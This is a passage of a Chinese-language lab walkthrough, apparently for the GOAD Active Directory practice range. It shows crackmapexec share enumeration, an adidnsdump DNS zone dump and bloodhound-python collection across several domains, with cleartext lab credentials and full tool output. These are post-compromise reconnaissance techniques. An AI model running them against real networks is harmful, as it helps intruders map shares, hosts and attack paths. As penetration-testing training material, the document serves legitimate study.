SMB         192.168.56.23   445    BRAAVOS          [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.10   445    KINGSLANDING     [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated shares
SMB         192.168.56.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.56.11   445    WINTERFELL       -----           -----------     ------
SMB         192.168.56.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.56.11   445    WINTERFELL       C$                              Default share
SMB         192.168.56.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       SYSVOL          READ            Logon server share 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public          READ,WRITE      Basic Read share for all domain users
SMB         192.168.56.10   445    KINGSLANDING     [+] Enumerated shares
SMB         192.168.56.10   445    KINGSLANDING     Share           Permissions     Remark
SMB         192.168.56.10   445    KINGSLANDING     -----           -----------     ------
SMB         192.168.56.10   445    KINGSLANDING     ADMIN$                          Remote Admin
SMB         192.168.56.10   445    KINGSLANDING     C$                              Default share
SMB         192.168.56.10   445    KINGSLANDING     CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.10   445    KINGSLANDING     IPC$            READ            Remote IPC
SMB         192.168.56.10   445    KINGSLANDING     NETLOGON        READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     SYSVOL          READ            Logon server share 
</code></pre>
</details>


```bash
crackmapexec smb 192.168.56.10-23 -u brandon.stark  -p iseedeadpeople -d north.sevenkingdoms.local --shares
```
<details>
<summary>展开查看</summary>
<pre><code class="bash">
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:True)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:True)
SMB         192.168.56.12   445    MEEREEN          [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
SMB         192.168.56.23   445    BRAAVOS          [+] north.sevenkingdoms.local\brandon.stark:iseedeadpeople 
SMB         192.168.56.12   445    MEEREEN          [+] Enumerated shares
SMB         192.168.56.12   445    MEEREEN          Share           Permissions     Remark
SMB         192.168.56.12   445    MEEREEN          -----           -----------     ------
SMB         192.168.56.12   445    MEEREEN          ADMIN$                          Remote Admin
SMB         192.168.56.12   445    MEEREEN          C$                              Default share
SMB         192.168.56.12   445    MEEREEN          IPC$                            Remote IPC
SMB         192.168.56.12   445    MEEREEN          NETLOGON        READ            Logon server share 
SMB         192.168.56.12   445    MEEREEN          SYSVOL          READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     [+] Enumerated shares
SMB         192.168.56.10   445    KINGSLANDING     Share           Permissions     Remark
SMB         192.168.56.10   445    KINGSLANDING     -----           -----------     ------
SMB         192.168.56.10   445    KINGSLANDING     ADMIN$                          Remote Admin
SMB         192.168.56.10   445    KINGSLANDING     C$                              Default share
SMB         192.168.56.10   445    KINGSLANDING     CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated shares
SMB         192.168.56.10   445    KINGSLANDING     IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.56.10   445    KINGSLANDING     NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       -----           -----------     ------
SMB         192.168.56.10   445    KINGSLANDING     SYSVOL          READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.56.11   445    WINTERFELL       C$                              Default share
SMB         192.168.56.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       SYSVOL          READ            Logon server share 
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public          READ,WRITE      Basic Read share for all domain users
</code></pre>
</details>

```bash
crackmapexec smb 192.168.56.10-23 -u hodor  -p hodor -d north.sevenkingdoms.local --shares
```

<details>
<summary>展开查看</summary>
<pre><code class="bash">
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.23   445    BRAAVOS          [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.10   445    KINGSLANDING     [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.12   445    MEEREEN          [+] north.sevenkingdoms.local\hodor:hodor 
SMB         192.168.56.22   445    CASTELBLACK      [+] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public          READ            Basic Read share for all domain users
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated shares
SMB         192.168.56.11   445    WINTERFELL       Share           Permissions     Remark
SMB         192.168.56.11   445    WINTERFELL       -----           -----------     ------
SMB         192.168.56.11   445    WINTERFELL       ADMIN$                          Remote Admin
SMB         192.168.56.11   445    WINTERFELL       C$                              Default share
SMB         192.168.56.11   445    WINTERFELL       IPC$            READ            Remote IPC
SMB         192.168.56.11   445    WINTERFELL       NETLOGON        READ            Logon server share 
SMB         192.168.56.11   445    WINTERFELL       SYSVOL          READ            Logon server share 
SMB         192.168.56.23   445    BRAAVOS          [+] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public          READ,WRITE      Basic Read share for all domain users
SMB         192.168.56.12   445    MEEREEN          [+] Enumerated shares
SMB         192.168.56.12   445    MEEREEN          Share           Permissions     Remark
SMB         192.168.56.12   445    MEEREEN          -----           -----------     ------
SMB         192.168.56.12   445    MEEREEN          ADMIN$                          Remote Admin
SMB         192.168.56.10   445    KINGSLANDING     [+] Enumerated shares
SMB         192.168.56.12   445    MEEREEN          C$                              Default share
SMB         192.168.56.10   445    KINGSLANDING     Share           Permissions     Remark
SMB         192.168.56.12   445    MEEREEN          IPC$                            Remote IPC
SMB         192.168.56.10   445    KINGSLANDING     -----           -----------     ------
SMB         192.168.56.10   445    KINGSLANDING     ADMIN$                          Remote Admin
SMB         192.168.56.10   445    KINGSLANDING     C$                              Default share
SMB         192.168.56.12   445    MEEREEN          NETLOGON        READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     CertEnroll      READ            Active Directory Certificate Services share
SMB         192.168.56.12   445    MEEREEN          SYSVOL          READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     IPC$            READ            Remote IPC
SMB         192.168.56.10   445    KINGSLANDING     NETLOGON        READ            Logon server share 
SMB         192.168.56.10   445    KINGSLANDING     SYSVOL          READ            Logon server share 
</code></pre>
</details>

## DNS 转储

[Active Directory 集成 DNS 转储工具](https://github.com/dirkjanm/adidnsdump)
>默认情况下，Active Directory 中的任何用户都可以枚举域或林 DNS 区域中的所有 DNS 记录，类似于区域传输,此工具启用区域中所有 DNS 记录的枚举和导出，用于内部网络的侦察目的

```bash
adidnsdump -u 'north.sevenkingdoms.local\jon.snow' -p 'iknownothing' winterfell.north.sevenkingdoms.local
```
```bash
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 5 records
```
```bash
cat records.csv
```
```bash
type,name,value
A,winterfell,192.168.56.11
A,DomainDnsZones,192.168.56.11
?,castelblack,?
NS,@,winterfell.north.sevenkingdoms.local.
A,@,192.168.56.11
```

## Bloodhound
* Boodhound 是活动目录渗透测试的最佳工具之一,此工具将帮助您找到破解 AD 的所有路径，是您武器库中的必备工具！
* 要启动 bloodhound，您首先需要从不同的域中检索所有数据

Linux环境,直接用python脚本:

<https://github.com/fox-it/BloodHound.py>

Windows环境,可以用:

<https://github.com/BloodHoundAD/SharpHound>

RustHound支持ADCS收集:

<https://github.com/OPENCYBER-FR/RustHound>

### bloodhound-python

```bash
bloodhound-python --zip -c All -d north.sevenkingdoms.local -u brandon.stark -p iseedeadpeople -dc winterfell.north.sevenkingdoms.local -ns 192.168.56.11
```
```bash
INFO: Found AD domain: north.sevenkingdoms.local
WARNING: Could not find a global catalog server, assuming the primary DC has this role
If this gives errors, either specify a hostname with -gc or disable gc resolution with --disable-autogc
INFO: Getting TGT for user
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: winterfell.north.sevenkingdoms.local
INFO: Connecting to GC LDAP server: winterfell.north.sevenkingdoms.local
INFO: Found 17 users
INFO: Found 51 groups
INFO: Found 4 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: castelblack.north.sevenkingdoms.local
INFO: Querying computer: winterfell.north.sevenkingdoms.local
INFO: Done in 00M 02S
INFO: Compressing output into 20230611003939_bloodhound.zip
```
```bash
bloodhound-python --zip -c All -d sevenkingdoms.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc kingslanding.sevenkingdoms.local -ns 192.168.56.11
```
```bash
INFO: Found AD domain: sevenkingdoms.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: kingslanding.sevenkingdoms.local
INFO: Found 16 users
INFO: Found 59 groups
INFO: Found 3 gpos
INFO: Found 10 ous
INFO: Found 19 containers
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: kingslanding.sevenkingdoms.local
INFO: Done in 00M 02S
INFO: Compressing output into 20230611004030_bloodhound.zip
```
```bash
bloodhound-python --zip -c All -d essos.local -u brandon.stark@north.sevenkingdoms.local -p iseedeadpeople -dc meereen.essos.local -ns 192.168.56.12 --auth-method ntlm
```
```bash
INFO: Found AD domain: essos.local
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: meereen.essos.local
INFO: Found 11 users
INFO: Found 57 groups
INFO: Found 3 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 1 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: braavos.essos.local
INFO: Querying computer: meereen.essos.local
INFO: Done in 00M 02S
INFO: Compressing output into 20230611012109_bloodhound.zip
```


不添加-ns参数,dns解析不到我们在/etc/hosts设定的ip地址
*   -ns 名称服务器,--nameserver 名称服务,用于查询的备用名称服务器

使用Kerberos协议,报错:
```bash
INFO: Found AD domain: essos.local
INFO: Getting TGT for user
Traceback (most recent call last):
  File "/home/joker/.local/bin//bloodhound-python", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/joker/.local/lib/python3.11/site-packages/bloodhound/__init__.py", line 332, in main
    auth.get_tgt()
  File "/home/joker/.local/lib/python3.11/site-packages/bloodhound/ad/authentication.py", line 214, in get_tgt
    tgs, cipher, _, sessionkey = getKerberosTGS(servername, self.domain, self.kdc,
                                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 438, in getKerberosTGS
    r = sendReceive(message, domain, kdcHost)
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 91, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_BAD_INTEGRITY(Integrity check on decrypted field failed)
```
所以添加参数--auth-method ntml
* --auth-method {auto,ntlm,kerberos} 身份验证方法。强制使用Kerberos或NTLM，或者使用自动模式，在Kerberos失败时使用NTLM